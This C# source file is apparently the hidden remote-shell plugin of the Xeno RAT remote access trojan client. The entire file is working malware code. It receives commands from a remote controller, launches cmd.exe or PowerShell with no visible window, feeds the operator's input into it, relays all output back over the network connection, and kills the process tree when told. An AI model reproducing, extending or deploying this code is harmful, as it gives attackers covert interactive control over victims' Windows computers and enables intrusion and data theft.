using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading.Tasks;
using xeno_rat_client;


namespace Plugin
{
    public class Main
    {
        Process process;

        /// <summary>
        /// Runs the specified node and manages the communication with it.
        /// </summary>
        /// <param name="node">The node to be run and communicated with.</param>
        /// <exception cref="Exception">Thrown when an error occurs during the communication with the node.</exception>
        /// <returns>A task representing the asynchronous operation.</returns>
        /// <remarks>
        /// This method sends a byte array with a value of 3 to indicate that it has connected to the specified node.
        /// It then enters a loop to continuously receive data from the node and handle it accordingly.
        /// If the received data is null, it terminates any existing process and breaks out of the loop.
        /// If the received data indicates a command to be executed, it creates a new process and executes the command.
        /// The method also handles exceptions that may occur during the communication with the node.
        /// </remarks>
        public async Task Run(Node node)
        {
            await node.SendAsync(new byte[] { 3 });//indicate that it has connected
            while (node.Connected()) 
            {
                byte[] data = await node.ReceiveAsync();
                if (data == null) 
                {
                    if (process!=null)
                        KillProcessAndChildren(process.Id);
                    process?.Close();
                    process?.Dispose();
                    break;
                }
                if (data[0] == 0)
                {
                    process?.StandardInput.WriteLine(Encoding.UTF8.GetString(await node.ReceiveAsync()));
                }
                else if (data[0]==1)
                {
                    if (process != null)
                        KillProcessAndChildren(process.Id);
                    process?.Close();
                    process?.Dispose();
                    try
                    {
                        await CreateProc("cmd.exe", node);
                    }
                    catch 
                    { 
                    
                    }
                }
                else if (data[0] == 2)
                {
                    if (process != null)
                        KillProcessAndChildren(process.Id);
                    process?.Close();
                    process?.Dispose();
                    try
                    {
                        await CreateProc("powershell.exe", node);
                    }
                    catch { }
                }
            }
            if (process != null)
                KillProcessAndChildren(process.Id);
            process?.Close();
            process?.Dispose();
        }

        /// <summary>
        /// Kills the process with the specified process ID and all its child processes.
        /// </summary>
        /// <param name="pid">The process ID of the process to be killed.</param>
        /// <remarks>
        /// This method recursively finds and kills all child processes of the specified process ID.
        /// It first searches for all processes with the specified process ID as their parent process, and then kills each of them using their respective process IDs.
        /// After killing all child processes, it attempts to kill the main process with the specified process ID.
        /// If the process has already exited, it catches and handles the ArgumentException.
        /// </remarks>
        /// <exception cref="ArgumentException">Thrown when the process has already exited.</exception>
        private static void KillProcessAndChildren(int pid)
        {
            // Cannot close 'system idle process'.
            if (pid == 0)
            {
                return;
            }
            ManagementObjectSearcher searcher = new ManagementObjectSearcher
                    ("Select * From Win32_Process Where ParentProcessID=" + pid);
            ManagementObjectCollection moc = searcher.Get();
            foreach (ManagementObject mo in moc)
            {
                KillProcessAndChildren(Convert.ToInt32(mo["ProcessID"]));
            }
            try
            {
                Process proc = Process.GetProcessById(pid);
                proc.Kill();
                proc.Dispose();
            }
            catch (ArgumentException)
            {
                // Process already exited.
            }
        }

        /// <summary>
        /// Creates a new process and sets up redirection for standard input, output, and error.
        /// </summary>
        /// <param name="path">The file path of the process to be started.</param>
        /// <param name="node">The node to which the output and error data will be sent asynchronously.</param>
        /// <remarks>
        /// This method creates a new process using the specified file <paramref name="path"/> and sets up redirection for standard input, output, and error.
        /// It then asynchronously sends the output and error data to the specified <paramref name="node"/>.
        /// </remarks>
        public async Task CreateProc(string path, Node node) 
        {
            process = new Process();
            process.StartInfo.FileName = path;
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.OutputDataReceived += async (sender, e) =>
            {
                if (e.Data != null)
                {
                    await node.SendAsync(Encoding.UTF8.GetBytes(e.Data));
                }
            };

            process.ErrorDataReceived += async (sender, e) =>
            {
                if (e.Data !=null)
                {
                    await node.SendAsync(Encoding.UTF8.GetBytes(e.Data));
                }
            };
            process.Start();
            process.BeginOutputReadLine();
            process.BeginErrorReadLine();
        }
    }
}
